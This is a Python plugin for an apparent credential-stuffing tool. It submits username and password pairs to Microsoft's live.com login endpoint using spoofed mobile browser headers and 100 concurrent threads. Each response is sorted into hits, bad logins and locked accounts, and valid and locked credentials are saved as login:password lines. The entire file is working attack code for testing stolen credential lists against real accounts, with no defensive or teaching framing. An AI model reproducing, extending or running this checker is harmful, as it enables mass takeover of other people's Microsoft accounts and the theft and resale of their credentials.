from core.base_checker import BaseChecker
from typing import Dict, Any
import requests
import time

class MicrosoftChecker(BaseChecker):
    """Microsoft account checker"""
    
    LOGIN_URL = 'https://login.live.com/ppsecure/post.srf'
    
    def get_threads(self) -> int:
        return 100  # Microsoft يتحمل 100 ثريد
    
    def check_account(self, username: str, password: str) -> Dict[str, Any]:
        try:
            cookies = {
                'MicrosoftApplicationsTelemetryDeviceId': '14a9a8ff-3636-4825-a703-0db38efdcd20',
                'MUID': 'c34ce51b7cdd443a93a3657f33f4c36e',
            }
            
            headers = {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': 'https://login.live.com',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
            }
            
            params = {
                'cobrandid': 'ab0455a0-8d03-46b9-b18b-df2f57b9e44c',
                'id': '292841',
                'contextid': '3F4165B453B5320C',
                'opid': '321E49E08810F944',
                'bk': '1734351835',
                'uaid': '58d0ccd482b043f4ad9ad325922d098d',
                'pid': '0',
            }
            
            data = f'login={username}&loginfmt={username}&passwd={password}'
            
            response = requests.post(
                self.LOGIN_URL, 
                params=params, 
                cookies=cookies, 
                headers=headers, 
                data=data,
                timeout=15
            )
            
            response_text = response.text
            account_data = {
                "login": username,
                "password": password,
                "type": "unknown"
            }
            
            # تحليل الاستجابة
            if "__Host-MSAAUTH" in response.cookies:
                account_data["type"] = "hit"
                should_save = True
            elif "incorrect" in response_text or "doesn't exist" in response_text:
                account_data["type"] = "bad"
                should_save = False
            elif "recover" in response_text or "locked" in response_text:
                account_data["type"] = "locked"
                should_save = True
            else:
                account_data["type"] = "unknown"
                should_save = False
            
            return {
                "status": "valid" if should_save else "bad",
                "account_data": account_data,
                "should_save": should_save
            }
            
        except Exception as e:
            return {"status": "error", "username": username, "error": str(e)}
    
    def should_save(self, account_data: Dict[str, Any]) -> bool:
        return account_data.get("type") in ["hit", "locked"]
    
    def save_format(self, account_data: Dict[str, Any]) -> str:
        return f"{account_data['login']}:{account_data['password']} | type={account_data['type']}\n"
